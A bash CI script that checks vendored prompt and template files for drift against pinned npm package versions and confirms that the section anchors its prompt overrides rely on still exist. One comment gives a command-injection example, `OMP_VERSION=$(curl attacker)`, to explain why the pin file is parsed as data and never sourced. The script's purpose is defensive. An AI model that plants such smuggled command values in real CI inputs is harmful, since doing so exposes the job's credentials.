#!/usr/bin/env bash
#
# Fail if our verbatim upstream copies have drifted from the pinned versions.
#
# This is what makes PROVENANCE.md's fidelity claim checkable. Two directions
# of drift both matter:
#
#   1. Someone hand-edits a vendored file or template here. That silently turns
#      "verbatim upstream" into "our fork of upstream", which is exactly the
#      thing this package got wrong before.
#   2. Upstream changes a file we depend on. Then the pin needs bumping AND our
#      section overrides need re-deriving against the new text.
#
# It also asserts the anchors our overrides key off still exist, because a
# rendered prompt that quietly lost its Distribution Guidelines section would
# produce a review with no fan-out instructions at all.
set -euo pipefail

cd "$(dirname "$0")/.."
ROOT=$PWD

# UPSTREAM is parsed as DATA, never sourced and never eval'd.
#
# This guard is meant to run on untrusted diffs — that is the entire point of a
# CI drift check — and UPSTREAM is a tracked file a pull request can edit. Both
# `. <(...)` and `eval` would happily execute `OMP_VERSION=$(curl attacker)`
# with whatever credentials the job holds. So: read line by line, accept only
# the four keys this script actually needs, and constrain the values to the
# characters a package name or semver can contain.
#
# The previous `export $(grep -E '^[A-Z_]+=' UPSTREAM | xargs)` had a different
# bug: with no matches it invoked `export` with zero arguments, which prints the
# entire exported environment (every `declare -x`, secrets included) and exits 0,
# so the real symptom was an unbound-variable death several lines later.
# Preflight before the parse loop. `done <UPSTREAM` is the only thing that opens
# the file, and a failed redirection under `set -e` aborts with status 1 — the
# code this script reserves for "checked, and it drifted". A deleted or renamed
# pin file is a cannot-check condition (2), like every other one here.
if [ ! -r UPSTREAM ]; then
	echo "UPSTREAM is missing or unreadable — cannot check for drift." >&2
	exit 2
fi

OMP_PACKAGE= OMP_VERSION= UTILS_PACKAGE= UTILS_VERSION=
while IFS= read -r line; do
	case $line in \#* | "") continue ;; esac
	key=${line%%=*}
	value=${line#*=}
	[ "$key" = "$line" ] && continue # no '=' on this line
	case $key in
	OMP_PACKAGE | OMP_VERSION | UTILS_PACKAGE | UTILS_VERSION) ;;
	*) continue ;;
	esac
	if ! printf '%s' "$value" | grep -qE '^[A-Za-z0-9@._/-]+$'; then
		echo "UPSTREAM: refusing $key=$value — value must match [A-Za-z0-9@._/-]+" >&2
		exit 2
	fi
	case $key in
	OMP_PACKAGE) OMP_PACKAGE=$value ;;
	OMP_VERSION) OMP_VERSION=$value ;;
	UTILS_PACKAGE) UTILS_PACKAGE=$value ;;
	UTILS_VERSION) UTILS_VERSION=$value ;;
	esac
done <UPSTREAM

for required in OMP_PACKAGE OMP_VERSION UTILS_PACKAGE UTILS_VERSION; do
	if [ -z "${!required}" ]; then
		echo "UPSTREAM is missing a usable $required= pin — nothing to check. Restore the pins." >&2
		exit 2
	fi
done

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT

# A failed download must NOT look like drift. The old form swallowed npm's
# output in a subshell whose status was never checked, and `set -e` does not
# propagate errexit out of a failing `( ... )` when the function is called from
# a command substitution (`UTILS=$(fetch ...)`) — so `echo` still ran, the caller
# got a path that did not exist, and every compare reported "MISSING upstream:
# ... the pin needs attention". An offline run accused upstream of moving files.
# Exit 2 distinguishes "could not check" from exit 1 "checked, and it drifted".
fetch() { # <package> <version> -> extracted package/ dir on stdout
	local pkg=$1 version=$2 dir="$WORK/${1//[^a-zA-Z0-9]/_}" log
	log="$dir.log"
	mkdir -p "$dir"
	if ! (cd "$dir" && npm pack "${pkg}@${version}" && tar xzf ./*.tgz) >"$log" 2>&1; then
		echo "FETCH FAILED: ${pkg}@${version} could not be downloaded or unpacked." >&2
		echo "This is a network, registry or auth problem — NOT upstream drift." >&2
		sed 's/^/  | /' "$log" >&2
		exit 2
	fi
	echo "$dir/package"
}

FAILED=0
compare() { # <local path> <upstream root> <path in package>
	local local_path=$1 up_root=$2 up_path=$3
	if [ ! -f "$ROOT/$local_path" ]; then
		echo "MISSING locally: $local_path"
		FAILED=1
		return
	fi
	if [ ! -f "$up_root/$up_path" ]; then
		echo "MISSING upstream: $up_path (upstream moved or renamed it — the pin needs attention)"
		FAILED=1
		return
	fi
	if diff -u "$up_root/$up_path" "$ROOT/$local_path" >"$WORK/diff.txt"; then
		echo "ok        $local_path"
	else
		echo "DRIFTED   $local_path  (vs $up_path)"
		sed 's/^/    /' "$WORK/diff.txt"
		FAILED=1
	fi
}

echo "== $UTILS_PACKAGE@$UTILS_VERSION"
UTILS=$(fetch "$UTILS_PACKAGE" "$UTILS_VERSION")
compare vendor/prompt.ts "$UTILS" src/prompt.ts
compare vendor/template.ts "$UTILS" src/template.ts

echo "== $OMP_PACKAGE@$OMP_VERSION"
OMP=$(fetch "$OMP_PACKAGE" "$OMP_VERSION")
compare src/prompts/review-request.md "$OMP" src/prompts/review-request.md
compare src/prompts/review-custom-request.md "$OMP" src/prompts/review-custom-request.md
compare src/prompts/review-headless-request.md "$OMP" src/prompts/review-headless-request.md
compare upstream-reference/reviewer.md "$OMP" src/prompts/agents/reviewer.md

# The override anchors. src/overrides.ts replaces these two sections because
# they instruct the reviewer to use omp machinery pi does not have (the `task`
# tool, and yield-section findings). If upstream renames a heading, the
# override silently becomes a no-op and the prompt ships omp-only instructions.
echo "== override anchors"
check_anchor() { # <file> <exact whole line>
	if grep -qxF "$2" "$ROOT/$1"; then
		echo "ok        $1: $2"
	else
		echo "MISSING   $1: $2 — src/overrides.ts can no longer patch it"
		FAILED=1
	fi
}

# /review. Two sections replaced; the second ends at the conditional diff block
# rather than a heading, so that literal is an anchor too.
for anchor in "### Distribution Guidelines" "### Reviewer Instructions" "{{#if skipDiff}}"; do
	check_anchor src/prompts/review-request.md "$anchor"
done

# /review with custom instructions. Same two sections, h2 here. Checked because
# a silent no-op on this path ships omp's `task`-tool and yield instructions.
for anchor in "## Distribution" "## Reviewer Instructions" "## Custom Instructions"; do
	check_anchor src/prompts/review-custom-request.md "$anchor"
done

# Headless. Replaced by line PREFIX, not whole-line equality, so grep -q.
if grep -q '^Distribution: Use `task`' "$ROOT/src/prompts/review-headless-request.md"; then
	echo "ok        src/prompts/review-headless-request.md: line starting 'Distribution: Use \`task\`'"
else
	echo "MISSING   src/prompts/review-headless-request.md: no line starts 'Distribution: Use \`task\`'"
	FAILED=1
fi

if [ "$FAILED" -ne 0 ]; then
	cat <<'MSG'

Upstream drift detected.

If YOU changed a file above: revert it. Those files are verbatim upstream by
contract; put your change in src/overrides.ts or src/prompts/pi-*.md instead.

If UPSTREAM changed: bump the version in ./UPSTREAM, re-copy the files, and
re-derive the section overrides in src/prompts/pi-*.md against the new text.
MSG
	exit 1
fi

echo
echo "No drift: every verbatim file matches its pinned upstream."
